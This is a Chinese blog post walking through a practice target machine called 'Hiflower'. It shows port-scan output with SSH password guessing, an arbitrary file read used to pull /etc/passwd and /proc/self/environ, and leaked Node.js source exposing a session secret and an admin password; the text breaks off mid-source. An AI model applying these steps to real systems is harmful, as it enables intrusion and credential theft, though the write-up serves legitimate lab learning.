@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="userflag(打点)fscan扫一下 123456789101112131415161718192.168.1.20:22 open192.168.1.20:80 open192.168.1.20:3000 open192.168.1.20:8080 open[*] alive ports len is: 4start vulscan[*] WebTitle http:&#x2F;&#x2F;192.168.1.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hiflower靶机">
+<meta property="og:url" content="https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="Rufeii">
+<meta property="og:description" content="userflag(打点)fscan扫一下 123456789101112131415161718192.168.1.20:22 open192.168.1.20:80 open192.168.1.20:3000 open192.168.1.20:8080 open[*] alive ports len is: 4start vulscan[*] WebTitle http:&#x2F;&#x2F;192.168.1.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221204743211.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221212621647.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221220307073.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221222338714.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221222536181.png">
+<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221223158606.png">
+<meta property="article:published_time" content="2026-02-21T12:19:35.000Z">
+<meta property="article:modified_time" content="2026-02-21T14:52:58.288Z">
+<meta property="article:author" content="Rufeii">
+<meta property="article:tag" content="恶意session">
+<meta property="article:tag" content="docker逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260221204743211.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/website.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>Hiflower靶机</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">ab0ut</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categ0ries</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2026/02/22/%E6%B5%85%E6%9E%90CVE-2025-61686-ReactRouter-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CCertify/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&text=Hiflower靶机"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&is_video=false&description=Hiflower靶机"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hiflower靶机&body=Check out this article: https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&title=Hiflower靶机"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&name=Hiflower靶机&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/02/21/Hiflower%E9%9D%B6%E6%9C%BA/&t=Hiflower靶机"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#userflag-%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">userflag(打点)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootflag-docker%E9%80%83%E9%80%B8"><span class="toc-number">2.</span> <span class="toc-text">rootflag(docker逃逸)</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Hiflower靶机
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rufeii</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-02-21T12:19:35.000Z" class="dt-published" itemprop="datePublished">2026-02-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/docker%E9%80%83%E9%80%B8/" rel="tag">docker逃逸</a>, <a class="p-category" href="/tags/%E6%81%B6%E6%84%8Fsession/" rel="tag">恶意session</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="userflag-打点"><a href="#userflag-打点" class="headerlink" title="userflag(打点)"></a>userflag(打点)</h2><p>fscan扫一下</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.20:22 open</span><br><span class="line">192.168.1.20:80 open</span><br><span class="line">192.168.1.20:3000 open</span><br><span class="line">192.168.1.20:8080 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://192.168.1.20       code:200 len:154    title:index</span><br><span class="line">[*] WebTitle http://192.168.1.20:8080  code:200 len:2674   title:🌿 花卉知识库 Wiki</span><br><span class="line">[*] WebTitle http://192.168.1.20:3000  code:200 len:1611   title:Flower App</span><br><span class="line">[+] PocScan http://192.168.1.20:8080 poc-yaml-natshell-arbitrary-file-read</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 root root@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 root 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 root system ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 admin Admin@123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 admin 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ssh 192.168.1.20:22 admin a123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 4/4</span><br><span class="line">[*] 扫描结束,耗时: 10m37.7373552s</span><br></pre></td></tr></table></figure>
+
+<p>ssh密码一般尝试三次错了就得重新连接，这里重点关注8080和3000，并且这里8080已经扫出了任意文件读取</p>
+<p>&#x2F;etc&#x2F;passwd最后一行数据</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sublarge:x:1001:1001::/home/Sublarge:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>这里有个用户目录</p>
+<p><img src="/../images/achieve/2026/1/image-20260221204743211.png" alt="image-20260221204743211"></p>
+<p>由于我是第一次打这类靶机，所以并不清除flag的位置，所以我不是这样获取第一个flag的！</p>
+<p>那么我就是到处读读并看看能不能得到什么有效的信息&#x2F;proc&#x2F;self&#x2F;environ(之前打ctf喜欢读)</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME=a03b8c7326cf</span><br><span class="line">YARN<span class="built_in">_</span>VERSION=1.22.22</span><br><span class="line">NODE<span class="built_in">_</span>VERSION=20.20.0</span><br><span class="line"></span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">SHLVL=0</span><br><span class="line"></span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="built_in">_</span>=/usr/local/bin/node</span><br></pre></td></tr></table></figure>
+
+<p>nodejs，工作目录为&#x2F;app</p>
+<p>所以尝试读读下面的源码</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/app/index.js</span><br><span class="line">/app/app.js</span><br><span class="line">/app/main.js</span><br><span class="line">/app/server.js</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>这里读到了&#x2F;app&#x2F;server.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http <span class="keyword">from</span> <span class="string">&quot;http&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createFileSessionStorage &#125; <span class="keyword">from</span> <span class="string">&quot;@react-router/node&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; parse &#125; <span class="keyword">from</span> <span class="string">&quot;querystring&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DONE: cron runs /opt/flower.sh every minute</span></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> create /opt/flower.sh to do something interesting</span></span><br><span class="line"><span class="keyword">const</span> storage = <span class="title function_">createFileSessionStorage</span>(&#123;</span><br><span class="line">  <span class="attr">dir</span>: <span class="string">&quot;./sessions&quot;</span>,</span><br><span class="line">  <span class="attr">cookie</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;session&quot;</span>,</span><br><span class="line">    <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="attr">sameSite</span>: <span class="string">&quot;lax&quot;</span>,</span><br><span class="line">    <span class="attr">secrets</span>: [<span class="string">&quot;mazesec&quot;</span>], </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = [];</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ADMIN_USER</span> = &#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&quot;Maze-Sec2026&quot;</span>,</span><br><span class="line">  <span class="attr">role</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> css = <span class="string">`</span></span><br><span class="line"><span class="string">  body &#123; font-family: &#x27;Segoe UI&#x27;, &#x27;Microsoft YaHei&#x27;, sans-serif; background: #fff0f5; color: #4a4a4a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; &#125;</span></span><br><span class="line"><span class="string">  .container &#123; background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 400px; text-align: center; border: 2px solid #ffbed2; &#125;</span></span><br><span class="line"><span class="string">  h1 &#123; color: #d63384; display: flex; align-items: center; justify-content: center; gap: 10px; &#125;</span></span><br><span class="line"><span class="string">  input &#123; display: block; width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box;&#125;</span></span><br><span class="line"><span class="string">  button &#123; background: #ff69b4; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; font-size: 16px; transition: background 0.3s; width: 100%; &#125;</span></span><br><span class="line"><span class="string">  button:hover &#123; background: #d63384; &#125;</span></span><br><span class="line"><span class="string">  .flower-deco &#123; font-size: 40px; margin: 10px 0; &#125;</span></span><br><span class="line"><span class="string">  .links &#123; margin-top: 20px; font-size: 14px; &#125;</span></span><br><span class="line"><span class="string">  a &#123; color: #d63384; text-decoration: none; &#125;</span></span><br><span class="line"><span class="string">  .error &#123; color: red; margin: 10px 0; font-size: 14px; &#125;</span></span><br><span class="line"><span class="string">  .dashboard-content &#123; text-align: left; background: #fffafc; padding: 15px; border-radius: 8px; border: 1px dashed #ffbed2; margin-top: 20px; &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderPage</span>(<span class="params">content, title = <span class="string">&quot;Flower App&quot;</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;<span class="subst">$&#123;title&#125;</span>&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;style&gt;<span class="subst">$&#123;css&#125;</span>&lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;flower-deco&quot;&gt;🌸 🌺 🌻&lt;/div&gt;</span></span><br><span class="line"><span class="string">    <span class="subst">$&#123;content&#125;</span></span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBody</span>(<span class="params">req</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> body = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="function"><span class="params">chunk</span> =&gt;</span> &#123; body += chunk.<span class="title function_">toString</span>(); &#125;);</span><br><span class="line">    req.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="function">() =&gt;</span> &#123; <span class="title function_">resolve</span>(<span class="title function_">parse</span>(body)); &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">redirect</span>(<span class="params">res, location, cookie = <span class="literal">null</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> headers = &#123; <span class="string">&quot;Location&quot;</span>: location &#125;;</span><br><span class="line">  <span class="keyword">if</span> (cookie) headers[<span class="string">&quot;Set-Cookie&quot;</span>] = cookie;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">302</span>, headers);</span><br><span class="line">  res.<span class="title function_">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http.<span class="title function_">createServer</span>(<span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>, <span class="string">`http://<span class="subst">$&#123;req.headers.host&#125;</span>`</span>);</span><br><span class="line">  <span class="keyword">const</span> session = <span class="keyword">await</span> storage.<span class="title function_">getSession</span>(req.<span class="property">headers</span>.<span class="property">cookie</span>);</span><br><span class="line">  <span class="keyword">const</span> flashError = session.<span class="title function_">get</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (flashError) session.<span class="title function_">unset</span>(<span class="string">&quot;error&quot;</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">setHtmlHeader</span> = (<span class="params"></span>) =&gt; res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// --- 路由 ---</span></span><br><span class="line">  <span class="comment">// GET / - 首页</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> userId = session.<span class="title function_">get</span>(<span class="string">&quot;userId&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (userId) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">redirect</span>(res, <span class="string">&quot;/dashboard&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;欢迎来到花园系统&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;请登录以查看我们的专属花卉收藏。&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;/login&quot;&gt;登录&lt;/a&gt; | &lt;a href=&quot;/register&quot;&gt;注册&lt;/a&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// GET /login</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span> &amp;&amp; url.<span class="property">pathname</span> === <span class="string">&quot;/login&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">renderPage</span>(<span class="string">`</span></span><br><span class="line"><span class="string">      &lt;h1&gt;🌺 登录&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;flashError ? <span class="string">`&lt;div class=&quot;error&quot;&gt;<span class="subst">$&#123;flashError&#125;</span>&lt;/div&gt;`</span> : <span class="string">&#x27;&#x27;</span>&#125;</span></span></span><br><span class="line"><span class="string">      &lt;form method=&quot;POST&quot; action=&quot;/login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;用户名&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot; required /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot;&gt;进入花园&lt;/button&gt;</span></span><br><span class="line"><span class="string">      &lt;/form&gt;</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;links&quot;&gt;&lt;a href=&quot;/register&quot;&gt;没有账号？点击注册&lt;/a&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>, <span class="string">&quot;Login&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">setHtmlHeader</span>();</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="keyword">await</span> storage.<span class="title function_">commitSession</span>(session));</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(html);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// POST 